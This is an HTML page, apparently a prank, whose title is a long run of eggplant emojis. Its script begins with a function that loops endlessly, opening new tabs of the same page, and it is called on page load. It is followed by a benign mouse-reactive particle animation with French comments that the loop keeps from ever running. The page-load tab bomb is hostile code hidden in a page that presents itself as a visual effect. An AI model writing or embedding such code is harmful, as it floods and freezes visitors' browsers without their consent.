  <title>🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆🍆</title>
</head>
<body>
<script>
const params = new URLSearchParams(window.location.search);
const depth = parseInt(params.get('d') || '0');
let a = 1;

function openNow() {
    while (a >0){
    const url = window.location.pathname + '?d=' + (depth + 1);
  window.open(url, '_blank');
}
}

openNow();

(function () {
  const CONFIG = {
    count: 120,          // Nombre de particules
    color: "#ff0000",    // Couleur de base (hex)
    maxRadius: 3,        // Rayon max des particules (px)
    speed: 0.6,          // Vitesse de déplacement
    connectDistance: 130,// Distance max pour tracer un lien
    mouseRadius: 120,    // Rayon d'attraction/répulsion souris
    mouseForce: 0.04,    // Force de l'effet souris (0 → 1)
    opacity: 0.85,       // Opacité globale
    background: null,    // null = transparent (canvas sur la page)
  };

  /* --- CANVAS SETUP --- */
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  Object.assign(canvas.style, {
    position: "fixed",
    top: "0",
    left: "0",
    width: "100%",
    height: "100%",
    pointerEvents: "none",   // laisse passer les clics
    zIndex: "0",
  });

  document.body.prepend(canvas);

  let W = (canvas.width = window.innerWidth);
  let H = (canvas.height = window.innerHeight);

  window.addEventListener("resize", () => {
    W = canvas.width = window.innerWidth;
    H = canvas.height = window.innerHeight;
  });

  /* --- SOURIS --- */
  const mouse = { x: -9999, y: -9999 };
  window.addEventListener("mousemove", (e) => {
    mouse.x = e.clientX;
    mouse.y = e.clientY;
  });
  window.addEventListener("mouseleave", () => {
    mouse.x = -9999;
    mouse.y = -9999;
  });

  /* --- PARTICULES --- */
  function hexToRgb(hex) {
    const r = parseInt(hex.slice(1, 3), 16);
    const g = parseInt(hex.slice(3, 5), 16);
    const b = parseInt(hex.slice(5, 7), 16);
    return `${r},${g},${b}`;
  }
  const RGB = hexToRgb(CONFIG.color);

  class Particle {
    constructor() { this.reset(true); }

    reset(random = false) {
      this.x  = random ? Math.random() * W : Math.random() < 0.5 ? 0 : W;
      this.y  = random ? Math.random() * H : Math.random() * H;
      this.vx = (Math.random() - 0.5) * CONFIG.speed * 2;
      this.vy = (Math.random() - 0.5) * CONFIG.speed * 2;
      this.r  = Math.random() * CONFIG.maxRadius + 0.5;
      this.alpha = Math.random() * 0.5 + 0.3;
    }

    update() {
      /* Attraction/répulsion souris */
      const dx = mouse.x - this.x;
      const dy = mouse.y - this.y;
      const dist = Math.hypot(dx, dy);

      if (dist < CONFIG.mouseRadius && dist > 0) {
        const force = (CONFIG.mouseRadius - dist) / CONFIG.mouseRadius;
        this.vx -= (dx / dist) * force * CONFIG.mouseForce * 3;
        this.vy -= (dy / dist) * force * CONFIG.mouseForce * 3;
      }

      /* Friction légère */
      this.vx *= 0.99;
      this.vy *= 0.99;

      this.x += this.vx;
      this.y += this.vy;

      /* Rebond sur les bords */
      if (this.x < 0 || this.x > W) this.vx *= -1;
      if (this.y < 0 || this.y > H) this.vy *= -1;
      this.x = Math.max(0, Math.min(W, this.x));
      this.y = Math.max(0, Math.min(H, this.y));
    }

    draw() {
      ctx.beginPath();
      ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(${RGB},${this.alpha * CONFIG.opacity})`;
      ctx.fill();
    }
  }

  const particles = Array.from({ length: CONFIG.count }, () => new Particle());

  /* --- BOUCLE D'ANIMATION --- */
  function animate() {
    ctx.clearRect(0, 0, W, H);

    if (CONFIG.background) {
      ctx.fillStyle = CONFIG.background;
      ctx.fillRect(0, 0, W, H);
    }

    /* Liens entre particules proches */
    for (let i = 0; i < particles.length; i++) {
      for (let j = i + 1; j < particles.length; j++) {
        const dx = particles[i].x - particles[j].x;
        const dy = particles[i].y - particles[j].y;
        const dist = Math.hypot(dx, dy);

        if (dist < CONFIG.connectDistance) {
          const alpha = (1 - dist / CONFIG.connectDistance) * 0.4 * CONFIG.opacity;
          ctx.beginPath();
          ctx.moveTo(particles[i].x, particles[i].y);
          ctx.lineTo(particles[j].x, particles[j].y);
          ctx.strokeStyle = `rgba(${RGB},${alpha})`;
          ctx.lineWidth = 0.8;
          ctx.stroke();
        }
      }
    }

    particles.forEach((p) => { p.update(); p.draw(); });
    requestAnimationFrame(animate);
  }

  animate();
})();
</script>
</body>
</html>
